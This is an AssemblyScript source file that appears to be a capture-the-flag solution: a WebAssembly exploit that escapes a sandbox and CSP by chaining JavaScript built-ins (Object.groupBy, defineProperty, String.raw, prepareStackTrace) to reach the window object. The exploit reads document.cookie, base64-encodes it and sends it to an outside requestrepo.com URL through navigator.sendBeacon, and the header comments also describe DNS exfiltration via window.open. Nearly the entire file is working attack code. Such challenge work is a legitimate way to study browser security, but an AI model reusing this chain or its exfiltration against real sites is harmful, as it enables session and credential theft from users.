/*
Some notes:
Challenge heavily inspired by https://x.com/thomasrinsma/status/1952353781162689007 & https://youtu.be/-MS4BV0-ry4
Just transcribing the solution in the video will not work due to the CSP, but its definitely worth getting some inspiration from it!
Also writing the exploit in wat is tedious and annoying, so there's assemblyscript for that (We're even given an editor (hint hint)).

The main part of the solution centers around a couple things:
- Creating an actual arbitrary string (The talk only shows creation of strings where the second character is a 0, because of groupby passing in a 0 as the second argument). In their example this works fine due to how eval works (i.e eval("00;alert(1)") works fine)
- Figuring a way to get a reference to the window object using prepareStackTrace, normally only called when the devtools are open, but it also works by default in puppeteer.
    The prepareStackTrace is a function that is called on the creation of errors in v8, giving full callsites.
    Also this prepareStackTrace trick does not work in the _start section because WebAssembly.instantiate in JS is a promise so we don't get back the full window callsite in the error callsite, so we will use the renderPixel for this. 
- Calling zero argument (arbitrary) functions.
- Optionally: this solution also converts the cookie to WASM first (calling base64, because encodeURIComponent is completely broken for longer strings for whatever reason).
- Optionally: the flag could be leaked with DNS exfiltration through window.open (For whatever reason it does not load the full page, only does a dns request), given the length of the flag, it would have to be leaked through multiple requests.
- Optionally: Call navigator.sendBeacon binding sendBeacon to navigator (Object.groupBy(["..."], navigator.sendBeacon) will not work)
- Also note that groupBy(["..."], fetch) will not work due to the second arguement to fetch being an integer which is not accepted
*/

@external("__proto__", "toString")
declare function proto_toString0(): externref;

@external("constructor", "getPrototypeOf")
declare function Object_getPrototypeOf1(a: externref): externref;

@external("constructor", "getOwnPropertyDescriptors")
declare function Object_getOwnPropertyDescriptors1(a: externref): externref;

@external("constructor", "getOwnPropertyDescriptor")
declare function Object_getOwnPropertyDescriptor2(a: externref, b: externref): externref;

@external("constructor", "values")
declare function Object_values1(a: externref): externref;

@external("constructor", "keys")
declare function Object_keys1(a: externref): externref;

@external("constructor", "groupBy")
declare function Object_groupBy2_extern(a: externref, b: externref): externref;

@external("constructor", "groupBy")
declare function Object_groupBy2_func(a: externref, b: funcref): externref;

@external("constructor", "assign")
declare function Object_assign1(a: externref): externref;

@external("constructor", "assign")
declare function Object_assign1_int(a: externref): i32;

@external("constructor", "assign")
declare function Object_assign2(a: externref, b: externref): externref;

@external("constructor", "assign")
declare function Object_assign1_funcref(a: funcref): externref;

@external("constructor", "defineProperty")
declare function Object_defineProperty3_int(a: externref, b: i32, c: externref): externref;

@external("constructor", "defineProperty")
declare function Object_defineProperty3(a: externref, b: externref, c: externref): externref;

@external("constructor", "getOwnPropertySymbols")
declare function Object_getOwnPropertySymbols1(a: externref): externref;

@external("constructor", "create")
declare function Object_create1(a: externref): externref;

@external("constructor", "getOwnPropertyNames")
declare function Object_getOwnPropertyNames1(a: externref): externref;

@external("constructor", "constructor")
declare function Object_constructor1(a: externref): externref;

const EXFILL_URL = "https://l2jxfjii.requestrepo.com/flag=";

/* required stub for assembly script */
export function abort_stub(message: usize, fileName: usize, line: u32, column: u32): void {
    unreachable();
}

/* Util functions */

var TARGET_INDEX: i32 = 0;
var TARGET_OBJECT: externref;

export function index_stub(val: externref, index: i32): externref {
    if (index == TARGET_INDEX) {
        TARGET_OBJECT = val;
    }
    return null;
}

export function index(arr: externref, index: i32): externref {
    TARGET_INDEX = index;
    Object_groupBy2_func(arr, index_stub);
    return TARGET_OBJECT;
}

var string_prototype: externref;
var object_prototype: externref;
var string_class: externref;

var sample_String: externref;
var toString_String: externref;
var valueOf_String: externref;
var value_String: externref;
var get_String: externref;
var set_String: externref;
var raw_String: externref;

var String_fromCharCode: externref;
var String_charCodeAt_Descriptor: externref; // A prototype function
var String_raw: externref;
var String_raw_Descriptor: externref;

var toPrimtive_Symbol: externref
var valueOf_Descriptor: externref

export function getDescriptorValue(descriptor: externref): externref {
    return index(Object_values1(descriptor), 0);
}

export function setupConstants(): void {
    /* Nothing special, just grabbing a ton of indexes to get some reuables */
    sample_String = proto_toString0();
    string_prototype = Object_getPrototypeOf1(sample_String);
    object_prototype = Object_getPrototypeOf1(string_prototype);

    var string_Descriptors = Object_getOwnPropertyDescriptors1(
        string_prototype
    );
    /* String constructor is at index 1 */
    string_class = getDescriptorValue(index(
        Object_values1(
            string_Descriptors
        ), 1));
    String_charCodeAt_Descriptor = index(Object_values1(string_Descriptors), 8);
    var string_class_Descriptors = Object_getOwnPropertyDescriptors1(string_class);

    String_fromCharCode = getDescriptorValue(index(Object_values1(string_class_Descriptors), 3));
    String_raw_Descriptor = index(Object_values1(string_class_Descriptors), 5);
    String_raw = getDescriptorValue(String_raw_Descriptor);
    raw_String = index(Object_keys1(string_class_Descriptors), 5);

    toString_String = index(Object_keys1(string_Descriptors), 40);

    value_String = index(Object_keys1(index(Object_values1(string_class_Descriptors), 0)), 0);

    let objectProtoDescriptors = Object_getOwnPropertyDescriptors1(object_prototype);
    valueOf_String = index(Object_keys1(objectProtoDescriptors), 9);
    valueOf_Descriptor = index(Object_values1(objectProtoDescriptors), 9);

    var objectProtoDescriptor = index(Object_values1(objectProtoDescriptors), 10);

    get_String = index(Object_keys1(objectProtoDescriptor), 0);
    set_String = index(Object_keys1(objectProtoDescriptor), 1);

    var iteratorSymbol = index(Object_getOwnPropertySymbols1(string_prototype), 0);
    toPrimtive_Symbol = index(Object_getOwnPropertySymbols1(Object_getPrototypeOf1(iteratorSymbol)), 1);
}


var stringCounter: i32 = 0;

export function createString_counter(): i32 {
    return stringCounter++;
}

var RETURN_CONSTANT1: externref;
export function return_constant1(): externref {
    return RETURN_CONSTANT1;
}

var RETURN_CONSTANT2: externref;
export function return_constant2(): externref {
    return RETURN_CONSTANT2;
}

var RETURN_STRING: string = "";

export function get_char(charString: externref, idx: externref): externref {
    RETURN_CONSTANT1 = charString;
    let getFn = getDescriptorValue(Object_getOwnPropertyDescriptors1(String_charCodeAt_Descriptor))

    let selfGetter = Object_create1(null);
    Object_defineProperty3(selfGetter, get_String, valueOf_Descriptor);

    let funcRef = Object_assign1_funcref(return_constant1);
    Object_defineProperty3(funcRef, value_String, selfGetter);
    
    let acc = Object_create1(null);
    Object_defineProperty3(acc, get_String, getFn);

    let desc = Object_create1(null);
    Object_defineProperty3(desc, toString_String, funcRef);
    Object_defineProperty3(desc, value_String, acc);

    let resultArr = Object_values1(sample_String);
    Object_defineProperty3_int(resultArr, 0, desc);

    let resInt = index(resultArr, 0);

    /*
        Now when this is called it does the following
        res[0] = desc;

        let resInt = res[0];

        res[0]  ← DefineProperty with Desc = ToPropertyDescriptor(desc)
                │
                └── Get(desc, "value")  // because "value" is present on desc
                        │
                        └── desc.value is an ACCESSOR → call its getter
                                getter = acc.get = String.prototype.charCodeAt
                                this    = desc
                                args    = []  (so index = 0)
                                │
                                └── inside charCodeAt:
                                        S = ToString(this)
                                            = ToString(desc)
                                                │
                                                └── Get(desc, "toString") → funcref
                                                    Call(funcref, desc) → RETURN_CONSTANT1
                                        return RETURN_CONSTANT1.charCodeAt(0) → int
    */

    RETURN_STRING += String.fromCharCode(Object_assign1_int(resInt));
    return resInt;
}

/* Real functions */
export function createString(str: string): externref {
    stringCounter = 0;

    let finalStringObject = Object_create1(null);
    /* Used for the define property, its details dont matter */
    let sampleValue = index(Object_values1(Object_getOwnPropertyDescriptors1(sample_String)), 0);

    for (let i = 0; i < str.length; i++) {
        /* Alternative way to get a character compared to the phrack72
         * implementation */
        let char = str.charCodeAt(i);

        let tmp = Object_create1(null);
        Object_defineProperty3_int(tmp, char, sampleValue);

        let tmpCharCodeArray = Object_groupBy2_extern(Object_keys1(tmp), String_fromCharCode);

        let tmpChar = index(index(Object_keys1(tmpCharCodeArray), 0), 0);

        let tmpCharObject = Object_groupBy2_func(tmpChar, createString_counter);

        Object_assign2(finalStringObject, tmpCharObject);

        /*
            tmp = {}
            DefineProperty(tmp, String(char), sampleValue)        // data prop

            tmpCharCodeArray = groupBy(Object.keys(tmp), fromCharCode)
            └─ keys(tmp) → [String(char)]
            └─ call fromCharCode("123") → "a"
            → { "a": ["123"] }

            tmpChar = keys(tmpCharCodeArray)[0][0] → "a"

            tmpCharObject = groupBy("a", createString_counter)
            └─ iterate "a": ['a'], callback returns "0" (first time)
            → { "0": ["a"] }

            assign(finalStringObject, tmpCharObject)
            → finalStringObject accumulates { "0": ["a"], "1": ["b"], ... }
        */
    }

    let rawStringArray = Object_values1(finalStringObject);

    /*
    Now for the trickery, the problem is that phrack72 uses groupBy("", String.raw)
    This will call String.raw({}, 0), meaning it will place a 0 in between characters
    We can't use this, therefore we can use some tricks, there are more ways to call
    functions with a parameter (see the navigator.sendBeacon example), but in this case
    we use a symbol primitive.
    */
    RETURN_CONSTANT1 = value_String;
    // We get an object {value: [['a'], ['b'], ...]}
    let rawStringObject = Object_groupBy2_func(rawStringArray, return_constant1);

    /* For reusablability reasons, we need an object with {configurable: true}, because
     * we're setting the prototype using defineProperty, which configurable defaults to
     * false */

    let dummyValueObject = index(Object_values1(Object_getOwnPropertyDescriptors1(object_prototype)), 4);
    // Merge them together and overwrite the value
    Object_assign2(dummyValueObject, rawStringObject);

    // Set object.prototype.raw to {value: [['a'], ['b'], ...]}
    Object_defineProperty3(object_prototype, raw_String, dummyValueObject);
    /*
        DefineProperty(Object.prototype, "raw", dummyValueObject)
        └─ ToPropertyDescriptor(dummyValueObject)
        └─ Get(dummyValueObject,"value") → [ ["H"], ["e"], ... ]      // data read
        → DataDescriptor { [[Value]] = segments, configurable:true, ... }
        → Object.prototype.raw is now a data prop whose value is our segments array
    */

    // The rest is to just create an object with [targetObj] where we have a ref to targetObj
    let tmp = Object_create1(null);
    Object_defineProperty3_int(tmp, 1337, sampleValue);

    let targetObjs = Object_values1(Object_getOwnPropertyDescriptors1(tmp));
    let targetObj = index(targetObjs, 0);

    Object_assign2(targetObj, String_raw);

    Object_defineProperty3(targetObj, toPrimtive_Symbol, String_raw_Descriptor);
    /*
        ToPrimitive(targetObj, "string")
        └─ Has @@toPrimitive → Call(String.raw, this=targetObj, args=["string"])
        (the "hint" argument is ignored by String.raw; it expects a "template object")
        └─ String.raw(targetObj, ...)
            • looks up targetObj.raw → found on Object.prototype.raw
            • reads our segments array [ ["H"], ["e"], ... ]
            • stitches a string (no substitutions provided) → "Hello..."
    */
    
    // Calls toPrimtive which is String.raw
    let rawObject = Object_groupBy2_extern(targetObjs, string_class);
    return index(Object_keys1(rawObject), 0);

    /*
        groupBy(targetObjs, String)
        └─ for each x in targetObjs:
            k = String(x)
            if x === targetObj:
                String(x)
                └─ ToPrimitive(x, "string")
                └─ Call(x[@@toPrimitive], x, ["string"])
                    └─ Call(String.raw, this=x, args=["string"])
                        ├─ Get(x,"raw") → (falls back to Object.prototype.raw)
                        │   → segments [ ["H"], ["e"], ... ]
                        └─ build "Hello..."
            raw[k].push(x)
        → rawObject has a single key: the constructed string

        Object.keys(rawObject)[0]  // ← the final string
    */
}

export function callProperty(obj: externref, key: externref): externref {
    let getterDesc = Object_create1(null);
    Object_defineProperty3(getterDesc, get_String, valueOf_Descriptor);
    Object_defineProperty3(key, value_String, getterDesc);

    let acc = Object_create1(null);
    Object_defineProperty3(acc, get_String, key);

    Object_defineProperty3(obj, value_String, acc);

    let resultArray = Object_values1(sample_String);
    Object_defineProperty3_int(resultArray, 0, obj);

    return index(resultArray, 0);
    /*
        DefineProperty(resultArray,"0", obj)
        └─ ToPropertyDescriptor(obj)
        └─ Get(obj,"value")  // accessor
            └─ [[Get]] = key  // from step 4
                └─ Call(key, this=obj, args=[])
                    └─ (returns R)
        → DataDescriptor { value: R }
        → resultArray[0] := R
    */
}

export function getProperty(obj: externref, keyDesc: externref, isValue: boolean): externref {
    let gDesc = Object_getOwnPropertyDescriptor2(keyDesc, get_String);

    if (!isValue) {
        // We need an object with configurable: true that also has getters and setters
        let acc = Object_getOwnPropertyDescriptor2(windowObject, createString("event"));

        Object_defineProperty3(acc, get_String, gDesc);
        Object_defineProperty3(obj, value_String, acc);

        let resultArr = Object_values1(sample_String);
        Object_defineProperty3_int(resultArr, 0, obj);
        return index(resultArr, 0);

        /*
            DefineProperty(resultArr,"0", obj)
            └─ ToPropertyDescriptor(obj)
            └─ Get(obj,"value")  // accessor
                └─ [[Get]] = F    // from acc.get
                    └─ Call(F, this=obj, args=[])
                        └─ returns R
            → DataDescriptor { value: R }
            → resultArr[0] = R
            → index(resultArr,0) === R
        */
    } else {
        // its a value type
        let vDesc = Object_getOwnPropertyDescriptor2(keyDesc, value_String);
        let resultArr = Object_values1(sample_String);
        Object_defineProperty3_int(resultArr, 0, vDesc);
        return index(resultArr, 0);
        /*
            DefineProperty(resultArr,"0", vDesc)
            └─ ToPropertyDescriptor(vDesc)
            └─ Get(vDesc,"value") → R        // data read, no call
            → DataDescriptor { value: R }
            → resultArr[0] = R
            → index(resultArr,0) === R
        */
    }
}


const TABLE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

export function base64Encode(s: string): string {
  var out = "";
  var i: i32 = 0;
  var len: i32 = s.length;
  while (i + 2 < len) {
    var b1: i32 = s.charCodeAt(i++) & 0xFF;
    var b2: i32 = s.charCodeAt(i++) & 0xFF;
    var b3: i32 = s.charCodeAt(i++) & 0xFF;
    var triple: i32 = (b1 << 16) | (b2 << 8) | b3;
    out += TABLE.charAt((triple >> 18) & 63)
         + TABLE.charAt((triple >> 12) & 63)
         + TABLE.charAt((triple >> 6) & 63)
         + TABLE.charAt(triple & 63);
  }
  var rem: i32 = len - i;
  if (rem === 1) {
    var x1: i32 = s.charCodeAt(i) & 0xFF;
    var t1: i32 = x1 << 16;
    out += TABLE.charAt((t1 >> 18) & 63)
         + TABLE.charAt((t1 >> 12) & 63)
         + "==";
  } else if (rem === 2) {
    var x2_1: i32 = s.charCodeAt(i) & 0xFF;
    var x2_2: i32 = s.charCodeAt(i + 1) & 0xFF;
    var t2: i32 = (x2_1 << 16) | (x2_2 << 8);
    out += TABLE.charAt((t2 >> 18) & 63)
         + TABLE.charAt((t2 >> 12) & 63)
         + TABLE.charAt((t2 >> 6) & 63)
         + "=";
  }
  return out;
}

var windowObject: externref;
export function hook(error: externref, structuredStackTrace: externref): void {
    // Depending on the caller this might be different, on remote and local this will be forced to be 2 due to the extra functions
    let windowCallSite = index(structuredStackTrace, 2);

    let getThis = getDescriptorValue(
        Object_getOwnPropertyDescriptor2(
            Object_getPrototypeOf1(windowCallSite),
            createString("getThis")
        ));
    
    windowObject = callProperty(windowCallSite, getThis);
    
    // get document and cookie
    let document = getProperty(windowObject, Object_getOwnPropertyDescriptor2(windowObject, createString("document")), false);
    let cookie = getProperty(document, Object_getOwnPropertyDescriptor2(Object_getPrototypeOf1(Object_getPrototypeOf1(document)), createString("cookie")), false);
    
    // Convert cookie into a assemblyscript string
    RETURN_STRING = "";
    Object_groupBy2_func(cookie, get_char);
    
    // Convert the cookie to base64, encodeURIComponent is broken for longer strings it seemed
    RETURN_STRING = base64Encode(RETURN_STRING);
    let exfill_target = EXFILL_URL + RETURN_STRING;

    // Convert wasm string to js string
    let targetUrl = createString(exfill_target);

    RETURN_CONSTANT2 = targetUrl;
    let emit = Object_assign1_funcref(return_constant2);

    let navigator = getProperty(windowObject, Object_getOwnPropertyDescriptor2(windowObject, createString("navigator")), false);


    /* Finally trickery to call sendBeacon, the point is that groupBy(..., sendBeacon) will fail because there is no underlying object */
    // We're defining strings first, because createString won't work when we mess with the proto more
    let zeroString = createString("0");
    
    let sendBeaconDesc = Object_getOwnPropertyDescriptor2(Object_getPrototypeOf1(navigator), createString("sendBeacon"));
    let setterDesc = Object_create1(null);
    Object_defineProperty3(setterDesc, set_String, sendBeaconDesc);
    Object_defineProperty3_int(object_prototype, 0, setterDesc);
    /*
        defineProperty(Object.prototype,"0", setterDesc)
        └─ ToPropertyDescriptor(setterDesc)
        └─ Get(setterDesc,"set") → sendBeacon (function)  // because we put the data value there
        → AccessorDescriptor { [[Set]] = sendBeacon }
        → Object.prototype["0"] is now an accessor with setter = navigator.sendBeacon
    */


    let baseIndexDesc = Object_getOwnPropertyDescriptor2(Object_values1(sample_String), zeroString);
    let selfGetter = Object_create1(null);

    Object_defineProperty3(selfGetter, get_String, valueOf_Descriptor);
    Object_defineProperty3(emit, value_String, selfGetter);
    
    let acc = Object_create1(null);
    Object_defineProperty3(acc, get_String, emit);

    Object_defineProperty3(baseIndexDesc, value_String, acc);

    let src = Object_create1(null);
    Object_defineProperty3_int(src, 0, baseIndexDesc);
    /*
        defineProperty(src,"0", baseIndexDesc)
        └─ ToPropertyDescriptor(baseIndexDesc)
        └─ Get(baseIndexDesc,"value")  // it's an ACCESSOR now
            └─ Call([[Get]]=emit, this=baseIndexDesc, args=[])
                └─ return_constant2() → RETURN_CONSTANT2 → targetUrl
        → DataDescriptor { value: targetUrl, enumerable: true, ... }
        → src["0"] becomes an own enumerable data property with value targetUrl
    */
    
    // call sendBeacon
    Object_assign2(navigator, src);

    /*
        for each own enumerable key K of src:
        let V = src[K];                    // here K === "0", V === targetUrl
        Set(navigator, K, V)               // [[Set]] on navigator
        └─ navigator has no own "0" → falls to Object.prototype["0"]
            which is an accessor with [[Set]] = sendBeacon
            → Call(sendBeacon, this=navigator, args=[targetUrl])
    */
}

export function exploit(): void {
    /* First define a number of useful objects */
    setupConstants();

    let prepareStackTraceString = createString("prepareStackTrace");

    /* The following is a trick to get a {value: myFunction} i.e funcRef.value = funcref */
    let getterDesc = Object_create1(null);
    Object_defineProperty3(getterDesc, get_String, valueOf_Descriptor);

    let funcRef = Object_assign1_funcref(hook);
    Object_defineProperty3(funcRef, value_String, getterDesc);

    // Now just do a define of object prototype of prepareStackTrace
    Object_defineProperty3(object_prototype, prepareStackTraceString, funcRef);
    // Object.prototype.prepareStackTraceString = {value: hook}

    // Trigger a WASM error to call into hook;
    unreachable();
}

/* An indirect call to force the same constants on remote */
export function main(): void {
    exploit();
}

export function renderPixel(x: i32, y: i32, dt: f32): i32 {
    exploit();
    return 0xAA00FF;
}
